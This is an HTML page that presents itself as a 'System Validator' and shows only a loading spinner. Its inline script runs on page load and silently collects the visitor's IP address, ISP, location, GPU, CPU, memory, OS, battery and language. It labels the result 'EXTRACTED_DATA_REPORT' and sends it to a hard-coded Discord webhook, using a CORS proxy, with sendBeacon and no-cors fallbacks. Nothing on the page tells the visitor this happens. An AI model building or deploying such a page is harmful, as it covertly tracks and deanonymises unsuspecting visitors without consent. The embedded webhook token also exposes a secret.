<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Validator</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .c { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: r 1s linear infinite; }
        @keyframes r { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="c"></div>
    <script>
        (async () => {
            const endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            const tunnel = "https://corsproxy.io/?";

            const getHardware = () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                return debug ? {
                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_ID),
                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_ID)
                } : { renderer: "N/A", vendor: "N/A" };
            };

            const getNetwork = async () => {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    return await response.json();
                } catch { return {}; }
            };

            const getBattery = async () => {
                try {
                    const b = await navigator.getBattery();
                    return `${Math.round(b.level * 100)}% ${b.charging ? 'Charging' : 'Discharging'}`;
                } catch { return "N/A"; }
            };

            const hw = getHardware();
            const net = await getNetwork();
            const bat = await getBattery();

            const data = {
                embeds: [{
                    title: "EXTRACTED_DATA_REPORT",
                    color: 0x00ff00,
                    fields: [
                        { name: "NETWORK", value: `IP: ${net.ip}\nORG: ${net.org}\nLOC: ${net.city}/${net.country_name}`, inline: false },
                        { name: "HARDWARE", value: `GPU: ${hw.renderer}\nCPU: ${navigator.hardwareConcurrency}\nMEM: ${navigator.deviceMemory}GB`, inline: false },
                        { name: "SYSTEM", value: `OS: ${navigator.platform}\nBAT: ${bat}\nLANG: ${navigator.language}`, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });

            // PRIMARY TRANSMISSION: TUNNELED FETCH
            fetch(tunnel + encodeURIComponent(endpoint), {
                method: 'POST',
                body: blob
            }).catch(() => {
                // FALLBACK 1: BEACON API
                navigator.sendBeacon(endpoint, blob);
                
                // FALLBACK 2: NO-CORS MODE
                fetch(endpoint, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: blob
                });
            });

        })();
    </script>
</body>
</html>
